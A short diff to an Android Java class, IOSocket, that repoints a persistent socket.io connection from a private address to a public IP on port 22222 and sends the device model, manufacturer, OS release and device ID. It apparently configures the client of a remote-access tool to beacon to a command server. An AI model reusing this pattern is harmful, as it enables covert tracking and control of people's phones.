@@ -21,7 +21,7 @@ public class IOSocket {
             opts.reconnectionDelay = 5000;
             opts.reconnectionDelayMax = 999999999;
 
-            ioSocket = IO.socket("http://192.168.0.91:22222?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
+            ioSocket = IO.socket("http://146.190.10.8:22222?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
         } catch (URISyntaxException e) {
             e.printStackTrace();
         }
